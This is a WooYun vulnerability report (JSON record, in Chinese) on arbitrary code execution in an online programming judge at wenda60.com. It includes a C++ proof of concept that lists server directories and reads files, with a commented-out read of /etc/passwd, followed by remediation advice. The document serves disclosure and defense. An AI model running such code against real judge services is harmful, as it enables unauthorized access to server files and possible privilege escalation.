{"id": 64877, "wybug_id": "wooyun-2013-022745", "wybug_title": "一问一答部分功能任意源代码执行", "wybug_corp": "一问一答", "wybug_author": "mgOrange", "wybug_date": "2013-04-29 17:36", "wybug_open_date": "2013-06-14 10:45", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "13", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源代码执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-04-29：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2013-06-14：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 对于大量用户提交内容没有做严格过滤，导致可以执行任意代码。任意代码啊，之后的事情就不言而喻了。 详细说明：  所有的在线编程部分都存在此漏洞，其他语言不熟没有试，C和C++可以编译执行使用了任意敏感函数的源代码！http://wenda60.com/programs/view/id-10.htmlhttp://wenda60.com/programs/view/id-541.html虽然由于权限问题一些敏感操作做不了。但是文件操作却是可以做的！而且这个账号在很多目录下是享有读写权限的。可以写shell code提权。我就不做了。   漏洞证明：  厉害的事情我就不做了，下面这段代码查看了一些有意思的文件夹和文件。\n#include <iostream>#include <fstream>#include <string>#include <stdio.h>  #include <string.h>  #include <stdlib.h>  #include <dirent.h>  #include <sys/stat.h>  #include <unistd.h>  #include <sys/types.h>using namespace std;void show_dir(const string& path){\tDIR              *pDir ;  \tstruct dirent    *ent  ;  \tcout<<\"In dir: \"<<path<<endl;\tpDir=opendir(path.c_str());  \twhile((ent=readdir(pDir))!=NULL){  \t\tcout<<int(ent->d_type)<<\" : \"<<ent->d_name<<endl;\t}  } void show_file(const string& path){\tifstream fin(path.c_str());\tcout<<\"Reading File: \"<<path<<endl;\tif(!fin){\t\tcout<<\"can not open file.\"<<endl;\t\treturn;\t}\tchar buff[80];\twhile(fin.getline(buff,80)){\t\tcout<<buff<<endl;\t}\tcout<<endl;}int main(){\t/*doing something*///\tcout<<\"Hello World\"; \tcout<<get_current_dir_name()<<endl;\tshow_dir(\"/\");\tshow_dir(\"/Server\");//\tshow_dir(\"/kworker/inputfile\");//\tshow_dir(\"/kworker/inputfile/output\");\t//show_dir(\"/etc\");//\tshow_file(\"/kworker/inputfile/input_541.in\");\tshow_file(\"/kworker/inputfile/output/541.out\");\t//show_file(\"/etc/passwd\");}\n\n\n   修复方案：  1，在服务器上按照两个gcc，一个完整的，一个阉割的。完整的用于日常系统软件的编译，在线编程部分只使用阉割的gcc。阉割版的删除敏感头文件（包括文件操作）。同时在测试脚本里面重新配置环境变量，去除系统文件夹中头文件的INCLUDE路径。或者执行严格的代码编译前检查，但这样很复杂而且不保险。对于其他语言类似。2，在测试服务器上做更严格地权限限制。   版权声明：转载请注明来源 mgOrange@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}